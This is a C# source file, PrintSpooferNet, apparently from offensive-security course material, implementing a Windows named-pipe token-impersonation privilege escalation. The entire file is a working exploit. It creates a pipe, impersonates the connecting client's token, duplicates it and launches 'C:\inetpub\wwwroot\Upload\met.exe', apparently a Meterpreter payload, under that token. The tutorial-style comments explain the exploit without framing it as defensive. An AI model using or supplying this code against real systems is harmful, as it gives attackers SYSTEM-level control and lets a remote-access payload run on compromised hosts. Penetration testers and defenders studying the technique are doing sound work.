using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace PrintSpooferNet
{
    class Program
    {



        [StructLayout(LayoutKind.Sequential)]



        // Structure required by ConvertSidToStringSid

        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }



        // Structure required by ConvertSidToStringSid

        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        // Structure required by CreateProcessWithTokenW
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        // Structure required by CreateProcessWithTokenW
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        // The following two flags are specified through enums.
        // Compared to the version that runs in an interactive shell we need to modify two additional arguments for CreateProcessWithTokenW to get our code working.
        // These are dwLogonFlags and dwCreationFlags, which 

        public enum CreationFlags
        {
            DefaultErrorMode = 0x04000000,
            NewConsole = 0x00000010,
            NewProcessGroup = 0x00000200,
            SeparateWOWVDM = 0x00000800,
            Suspended = 0x00000004,
            UnicodeEnvironment = 0x00000400,
            ExtendedStartupInfoPresent = 0x00080000
        }
        public enum LogonFlags
        {
            WithProfile = 1,
            NetCredentialsOnly
        }


        // Import the needed API functions and translate their arguments to C# data types

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();



        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        // Import some aditional functions only needed when *not* running in an interactive shell:

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();

        [DllImport("kernel32.dll")]
        static extern uint GetSystemDirectory([Out] StringBuilder lpBuffer, uint uSize);

        [DllImport("userenv.dll", SetLastError = true)]
        static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);

        static void Main(string[] args)
        {
            uint PIPE_WAIT = 0x00000000;
            uint PIPE_TYPE_BYTE = 0x00000000;
            IntPtr hToken = IntPtr.Zero;
            IntPtr hSystemToken = IntPtr.Zero;
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = "WinSta0\\Default";

            if (args.Length == 0)
            {
                Console.WriteLine("Usage: PrintSpooferNet.exe pipename");
                return;
            }

            // Create a Named Pipe with the name provided as argument
            string pipeName = args[0];
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 0x1000, 0x1000, 0, IntPtr.Zero);



            if (hPipe.ToInt32() == -1)
            {
                Console.WriteLine("Error in calling CreateNamedPipe: " + Marshal.GetLastWin32Error());
            }
            // Connect to pipe
            ConnectNamedPipe(hPipe, IntPtr.Zero);

            // Application waits for any incoming pipe client now
            // we’ll call ImpersonateNamedPipeClient to impersonate the client,
            // i.e ImpersonateNamedPipeClient will assign the impersonated token to the current thread
            ImpersonateNamedPipeClient(hPipe);

            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);

            int TokenInfLength = 0;
            GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
            // To allocate the TokenInformation buffer, we’ll use the .NET Marshal.AllocHGlobal method, which can allocate unmanaged memory
            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
            GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);

            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
            IntPtr pstr = IntPtr.Zero;
            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            // For the last argument (*StringSid), we've supplied the output string. Here we can simply supply an empty pointer and once it 
            // gets populated, marshal it to a C# string with Marshal.PtrToStringAuto:
            string sidstr = Marshal.PtrToStringAuto(pstr);
            // Now we print the SID associated with the token to the console, showing which user we impersonated (for debugging only):
            Console.WriteLine(@"Found sid {0}", sidstr);





            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);
            DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);

            StringBuilder sbSystemDir = new StringBuilder(256);
            uint res1 = GetSystemDirectory(sbSystemDir, 256);
            IntPtr env = IntPtr.Zero;
            bool res = CreateEnvironmentBlock(out env, hSystemToken, false);
            String name = WindowsIdentity.GetCurrent().Name;



            Console.WriteLine("Impersonated user is: " + name);



            RevertToSelf();

            res = CreateProcessWithTokenW(hSystemToken, (uint)LogonFlags.WithProfile, null, "C:\\inetpub\\wwwroot\\Upload\\met.exe", (uint)CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);



        }
    }
}